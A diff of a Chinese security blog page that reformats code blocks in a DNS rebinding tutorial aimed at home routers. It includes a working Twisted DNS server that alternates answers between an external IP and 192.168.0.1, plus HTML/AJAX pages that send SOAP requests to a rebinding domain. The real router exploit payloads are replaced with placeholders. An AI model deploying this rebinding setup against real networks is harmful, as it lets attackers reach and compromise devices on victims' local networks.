@@ -506,43 +506,8 @@
 <blockquote>
 <p>pip install twisted -i <a href="https://pypi.douban.com/simple" target="_blank" rel="noopener">https://pypi.douban.com/simple</a></p>
 </blockquote>
-<pre><code class="python">from twisted.internet import reactor, defer
-from twisted.names import client, dns, error, server
-record={}
-class DynamicResolver(object):
-    def _doDynamicResponse(self, query):
-        name = query.name.name
-        if name not in record or record[name]&lt;1:
-            ip = &quot;43.228.76.56&quot;
-        else:
-            ip = &quot;192.168.0.1&quot;
-        if name not in record:
-            record[name] = 0
-        record[name] += 1
-        print name + &quot; ===&gt; &quot; + ip
-        answer = dns.RRHeader(
-            name = name,
-            type = dns.A,
-            cls = dns.IN,
-            ttl = 0,
-            payload = dns.Record_A(address = b&#39;%s&#39; % ip, ttl=0)
-        )
-        answers = [answer]
-        authority = []
-        additional = []
-        return answers, authority, additional
-    def query(self, query, timeout=None):
-        return defer.succeed(self._doDynamicResponse(query))
-def main():
-    factory = server.DNSServerFactory(
-        clients=[DynamicResolver(), client.Resolver(resolv=&#39;/etc/resolv.conf&#39;)]
-    )
-    protocol = dns.DNSDatagramProtocol(controller=factory)
-    reactor.listenUDP(53, protocol)
-    reactor.run()
-if __name__ == &#39;__main__&#39;:
-    raise SystemExit(main())
-</code></pre>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line">record=&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip = <span class="string">"43.228.76.56"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip = <span class="string">"192.168.0.1"</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name] = <span class="number">0</span></span><br><span class="line">        record[name] += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> name + <span class="string">" ===&gt; "</span> + ip</span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name = name,</span><br><span class="line">            type = dns.A,</span><br><span class="line">            cls = dns.IN,</span><br><span class="line">            ttl = <span class="number">0</span>,</span><br><span class="line">            payload = dns.Record_A(address = <span class="string">b'%s'</span> % ip, ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure>
+
 <p>代码功能:</p>
 <ul>
 <li>第一次DNS请求返回的IP为43.228.76.56，其余时候返回的都是路由器的IP(192.168.0.1)。</li>
@@ -550,84 +515,11 @@ if __name__ == &#39;__main__&#39;:
 <p>剩下只需要把漏洞利用代码放到HTML中就可以了</p>
 <p><strong>具体漏洞利用代码已经删除,有兴趣的可自行Google</strong></p>
 <p>index.html:</p>
-<pre><code class="HTML">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
-    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
-    &lt;title&gt;&lt;/title&gt;
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"ajax.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-&lt;/head&gt;
-&lt;body&gt;
-&lt;iframe src=&quot;ajax.html&quot;&gt;&lt;/iframe&gt;
-&lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
 <p>ajax.html</p>
-<pre><code class="HTML">&lt;!DOCTYPE html&gt;
-&lt;html lang=&quot;en&quot;&gt;
-&lt;head&gt;
-    &lt;meta charset=&quot;UTF-8&quot;&gt;
-    &lt;title&gt;Title&lt;/title&gt;
-    &lt;script src=&quot;./jquery.min.js&quot;&gt;&lt;/script&gt;
-&lt;/head&gt;
-&lt;body&gt;
-    &lt;script&gt;
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xmg_01 = <span class="string">"payload1"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> xmg_02 = <span class="string">"payload2"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> settings = &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="string">"async"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"crossDomain"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"url"</span>: <span class="string">"http://dns_rebind.smilehacker.net/"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"headers"</span>: &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Content-Type"</span>: <span class="string">"application/xml"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"SOAPAction"</span>: <span class="string">"vuln_address"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"cache-control"</span>: <span class="string">"no-cache"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Postman-Token"</span>: <span class="string">"68b84160-c326-4b1a-a001-83b408d6435f"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            <span class="string">"data"</span>: <span class="string">"payload1"</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        $.ajax(settings).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(response);</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> setting = &#123;</span></span><br><span class="line"><span class="actionscript">            <span class="string">"async"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"crossDomain"</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"url"</span>: <span class="string">"http://dns_rebind.smilehacker.net/"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span></span><br><span class="line"><span class="actionscript">            <span class="string">"headers"</span>: &#123;</span></span><br><span class="line"><span class="actionscript">                <span class="string">"SOAPAction"</span>: <span class="string">"vuln_address"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"cache-control"</span>: <span class="string">"no-cache"</span>,</span></span><br><span class="line"><span class="actionscript">                <span class="string">"Postman-Token"</span>: <span class="string">"a1a1e78d-faa1-49c6-aef9-0c54b9f3c73b"</span></span></span><br><span class="line">            &#125;,</span><br><span class="line"><span class="actionscript">            <span class="string">"data"</span>: <span class="string">"payload2"</span></span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">        $.ajax(setting).done(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span></span><br><span class="line">            test();</span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.write(response);</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"test"</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"点"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"foo()"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-    var xmg_01 = &quot;payload1&quot;;
-
-    var xmg_02 = &quot;payload2&quot;;
-
-    function foo(){
-        var settings = {
-            &quot;async&quot;: true,
-            &quot;crossDomain&quot;: true,
-            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
-            &quot;method&quot;: &quot;POST&quot;,
-            &quot;headers&quot;: {
-                &quot;Content-Type&quot;: &quot;application/xml&quot;,
-                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
-                &quot;cache-control&quot;: &quot;no-cache&quot;,
-                &quot;Postman-Token&quot;: &quot;68b84160-c326-4b1a-a001-83b408d6435f&quot;
-            },
-            &quot;data&quot;: &quot;payload1&quot;
-        };
-
-        $.ajax(settings).done(function (response) {
-            document.write(response);
-        });
-
-        var setting = {
-            &quot;async&quot;: true,
-            &quot;crossDomain&quot;: true,
-            &quot;url&quot;: &quot;http://dns_rebind.smilehacker.net/&quot;,
-            &quot;method&quot;: &quot;POST&quot;,
-            &quot;headers&quot;: {
-                &quot;SOAPAction&quot;: &quot;vuln_address&quot;,
-                &quot;cache-control&quot;: &quot;no-cache&quot;,
-                &quot;Postman-Token&quot;: &quot;a1a1e78d-faa1-49c6-aef9-0c54b9f3c73b&quot;
-            },
-            &quot;data&quot;: &quot;payload2&quot;
-        };
-
-        $.ajax(setting).done(function (response) {
-            test();
-            document.write(response);
-        });
-
-
-    }
-
-    function test(){
-        document.write(&quot;test&quot;);
-    }
-
-&lt;/script&gt;
-
-&lt;input value=&quot;点&quot; type=&quot;button&quot; onclick=&quot;foo()&quot;&gt;
-&lt;/body&gt;
-&lt;/html&gt;</code></pre>
 <h4 id="攻击展示图"><a href="#攻击展示图" class="headerlink" title="攻击展示图:"></a>攻击展示图:</h4><ul>
 <li>攻击场景1:<br>此处修改了Firefox的DNS缓存时间为0,比且修改了DNS Server中域名返回外网IP的次数</li>
 </ul>
